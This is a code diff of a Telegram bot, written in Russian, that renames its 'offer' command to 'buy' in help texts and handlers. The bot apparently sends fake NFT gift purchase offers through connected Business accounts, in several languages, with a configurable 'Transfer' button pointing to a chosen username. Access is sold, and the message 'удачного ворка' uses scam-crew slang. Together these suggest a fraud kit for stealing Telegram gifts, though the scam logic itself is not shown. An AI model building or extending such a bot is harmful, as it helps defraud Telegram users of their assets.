@@ -61,14 +61,14 @@ def full_instruction():
         "<b>1. Подключение Telegram Business</b>\n"
         "Подключите этого бота к своему Business аккаунту через настройки Telegram\n\n"
         "<b>2. Отправка оферов</b>\n"
-        "<code>офер https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
-        "<code>офер https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
-        "<code>офер https://t.me/nft/PartySparkler-140864 2000 р</code>\n\n"
+        "<code>купить https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
+        "<code>купить https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
+        "<code>купить https://t.me/nft/PartySparkler-140864 2000 р</code>\n\n"
         "<b>3. Языки оферов</b>\n"
         "Добавьте код языка в конец команды:\n"
-        "<code>офер https://t.me/nft/... 500 грам англ</code>\n"
-        "<code>офер https://t.me/nft/... 500 грам араб</code>\n"
-        "<code>офер https://t.me/nft/... 500 грам китай</code>\n\n"
+        "<code>купить https://t.me/nft/... 500 грам англ</code>\n"
+        "<code>купить https://t.me/nft/... 500 грам араб</code>\n"
+        "<code>купить https://t.me/nft/... 500 грам китай</code>\n\n"
         "<b>4. Настройка профиля передачи</b>\n"
         "<code>/transfer @username</code>\n"
         "Меняет профиль в кнопке \"Передать\"\n\n"
@@ -80,9 +80,9 @@ def short_instruction():
     """Краткая инструкция для ошибок"""
     return (
         "<b>Использование</b>\n"
-        "<code>офер https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
-        "<code>офер https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
-        "<code>офер https://t.me/nft/PartySparkler-140864 2000 р</code>"
+        "<code>купить https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
+        "<code>купить https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
+        "<code>купить https://t.me/nft/PartySparkler-140864 2000 р</code>"
     )
 
 
@@ -219,8 +219,8 @@ async def get_connection(connection_id: str):
 async def process_offer(message: Message, business_connection_id: str | None = None):
     text = message.text or message.caption or ""
     parsed = parse_offer(text)
-    if text.strip().lower() in {".офер", ".offer", "офер", "offer"}:
-        await reply_message(message, instruction())
+    if text.strip().lower() in {"купить", "buy"}:
+        await reply_message(message, full_instruction())
         return
     if parsed.get("error"):
         await reply_message(message, error_text(parsed["error"]))
@@ -443,8 +443,8 @@ async def handle_text(message: Message, is_business: bool, state: FSMContext = N
         else:
             await reply_message(message, "❌ Эта команда предназначена для Business-чата.")
         return
-    # Поддерживаем разные варианты команды офер (с точкой и без)
-    if low.startswith(".офер") or low.startswith(".offer") or low.startswith("офер ") or low.startswith("offer "):
+    # Поддерживаем команду "купить"
+    if low.startswith("купить ") or low.startswith("buy "):
         await process_offer(message, message.business_connection_id if is_business else None)
         return
     if low.startswith("/admin") or low.startswith("/админ"):
@@ -824,9 +824,9 @@ async def check_payment_callback(call: CallbackQuery):
         # Отправляем приветственное сообщение
         success_text = ("✅ <b>Спасибо за покупку, удачного ворка!</b>\n\n"
                        "<b>Инструкция:</b>\n"
-                       "<code>офер [ссылка нфт] [кол-во] зв/грам</code>\n\n"
+                       "<code>купить [ссылка нфт] [кол-во] зв/грам/р</code>\n\n"
                        "Пример:\n"
-                       "<code>офер https://t.me/nft/PartySparkler-140864 150 грам</code>")
+                       "<code>купить https://t.me/nft/PartySparkler-140864 150 грам</code>")
         
         try:
             await call.message.edit_text(success_text)
@@ -881,9 +881,9 @@ async def approve_payment_callback(call: CallbackQuery):
     # Уведомляем пользователя
     success_text = ("✅ <b>Спасибо за покупку, удачного ворка!</b>\n\n"
                    "<b>Инструкция:</b>\n"
-                   "<code>офер [ссылка нфт] [кол-во] зв/грам</code>\n\n"
+                   "<code>купить [ссылка нфт] [кол-во] зв/грам/р</code>\n\n"
                    "Пример:\n"
-                   "<code>офер https://t.me/nft/PartySparkler-140864 150 грам</code>")
+                   "<code>купить https://t.me/nft/PartySparkler-140864 150 грам</code>")
     try:
         await bot.send_message(user_id, success_text)
     except:
